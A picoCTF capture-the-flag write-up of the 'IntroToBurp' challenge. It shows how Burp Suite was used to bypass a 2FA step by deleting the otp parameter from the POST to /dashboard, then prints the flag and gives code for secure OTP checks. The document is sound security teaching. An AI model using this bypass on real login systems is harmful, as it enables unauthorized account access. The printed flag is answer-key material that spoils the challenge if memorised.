# IntroToBurp — picoCTF

## Challenge

**Name:** IntroToBurp  
**Platform:** picoCTF  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Tool:** Burp Suite

---

## Vulnerability

**2FA/OTP Authentication Bypass**

The application failed to properly enforce the requirement for an OTP during the two-factor authentication process.

By removing the `otp` parameter completely from the POST request, the server did not reject the request and instead allowed authentication to proceed.

---

## Initial Clue

The challenge provided a registration page containing:

- Full Name
- Username
- Phone Number
- City
- Password

The challenge name, **IntroToBurp**, suggested that Burp Suite should be used to inspect and manipulate HTTP requests.

---

## Enumeration

First, I opened the challenge instance:

```text
http://titan.picoctf.net:<PORT>/
```

I verified that the server was reachable using `curl`:

```bash
curl -i http://titan.picoctf.net:<PORT>/
```

The server responded with:

```text
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
```

The registration page contained a form with the following parameters:

```text
csrf_token
full_name
username
phone_number
city
password
submit
```

---

## Burp Suite Setup

I started Burp Suite:

```bash
burpsuite
```

Burp was listening on:

```text
127.0.0.1:8080
```

This was verified with:

```bash
sudo ss -lntp | grep 8080
```

Output:

```text
LISTEN ... 127.0.0.1:8080 ... java
```

I then used Burp's browser and enabled:

```text
Proxy → Intercept → Intercept is ON
```

---

## Registration Request

After submitting the registration form, Burp intercepted the request.

The request contained:

```http
POST / HTTP/1.1
Host: titan.picoctf.net:<PORT>
Content-Type: application/x-www-form-urlencoded

csrf_token=...
&full_name=test
&username=testuser
&phone_number=0714368063
&city=ueue
&password=hkg
&submit=Register
```

The request was forwarded.

The application then redirected to:

```text
/dashboard
```

---

## 2FA Authentication

The dashboard displayed:

```text
2fa authentication

[ Enter OTP ] [Submit]
```

This indicated that an OTP was required after registration.

I entered a random OTP:

```text
1234
```

Burp intercepted the following request:

```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:<PORT>
Content-Type: application/x-www-form-urlencoded

otp=1234
```

The server responded:

```text
Invalid OTP
```

---

## Exploitation

At this point, instead of trying to guess or brute-force the OTP, I tested how the application handled the **absence of the OTP parameter**.

The original request was:

```http
POST /dashboard HTTP/1.1

otp=1234
```

I sent the request to **Burp Repeater**.

Then I removed:

```text
otp=1234
```

The resulting request had an empty body:

```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:<PORT>
...
Content-Type: application/x-www-form-urlencoded

```

I sent the modified request.

Instead of returning:

```text
Invalid OTP
```

the application accepted the request and revealed the flag.

---

## Why This Worked

The application did not properly enforce the requirement that an OTP must be supplied.

A secure implementation should perform both checks:

```python
otp = request.form.get("otp")

if otp is None:
    reject_request()

if otp != correct_otp:
    reject_request()

authenticate_user()
```

The vulnerable behavior was effectively equivalent to:

```python
otp = request.form.get("otp")

if otp:
    if otp != correct_otp:
        reject_request()

# authentication continues
```

When the parameter was completely removed:

```text
otp → None
```

the validation could be skipped.

This resulted in a **2FA bypass**.

---

## Flag

```text
picoCTF{#0TP_Bypvss_SuCc3$S_c94b61ac}
```

---

## Tools

* Burp Suite
* Burp Proxy
* Burp Repeater
* curl
* Kali Linux
* Web Browser

---

## What I Learned

### 1. HTTP parameters are controlled by the client

The browser sends parameters to the server, but the server must never blindly trust that they exist or are valid.

For example:

```text
otp=1234
```

is simply client-supplied data.

---

### 2. Authentication testing is not always about brute force

Instead of trying thousands of OTP values, I tested the application's logic.

I asked:

> What happens if the OTP isn't supplied at all?

This was more effective than brute-forcing.

---

### 3. Missing and empty parameters are different

These are not necessarily equivalent:

```text
otp=
```

and:

```text
(no otp parameter)
```

Both should be tested during web application testing.

---

### 4. Burp Repeater is useful for testing logic

Repeater allowed me to take a legitimate request and modify it manually:

```text
Original request
      ↓
otp=1234
      ↓
Remove parameter
      ↓
Send modified request
      ↓
Compare response
```

This is useful for testing authentication, authorization, input validation, and business logic.

---

## Why the Vulnerability Existed

The application failed to properly validate the OTP authentication state on the server side.

It appears that OTP validation was conditional on the parameter being present instead of making OTP verification a mandatory authentication requirement.

The application effectively trusted the client to provide the OTP parameter.

---

## How to Prevent It

The server should always require an OTP during the 2FA step.

For example:

```python
otp = request.form.get("otp")

if not otp:
    return "Invalid OTP", 401

if not verify_otp(otp):
    return "Invalid OTP", 401

# Only authenticate after successful verification
authenticate_user()
```

Additional protections should include:

* Require OTP verification before granting authenticated access.
* Validate authentication state server-side.
* Never treat a missing security parameter as successful authentication.
* Implement rate limiting on OTP attempts.
* Expire OTPs after a short period.
* Limit the number of failed attempts.
* Use secure session management.
* Never rely on client-side validation for security controls.

---

## Attack Flow

```text
Registration
     │
     ▼
POST /
     │
     ▼
Dashboard
     │
     ▼
2FA / OTP
     │
     ▼
POST /dashboard
     │
     ├── otp=1234
     │       │
     │       ▼
     │   Invalid OTP
     │
     └── remove otp parameter
             │
             ▼
       OTP validation bypass
             │
             ▼
            FLAG
```

---

## Key Takeaway

The most important lesson from this challenge was:

> **Don't just test whether an input is invalid. Test what happens when the input is missing, empty, malformed, or modified.**

In Burp, authentication requests should be examined for parameters that control security decisions.

For this challenge:

```text
otp=1234
```

was the obvious authentication parameter.

Removing it completely exposed the application's failure to enforce the second authentication factor.
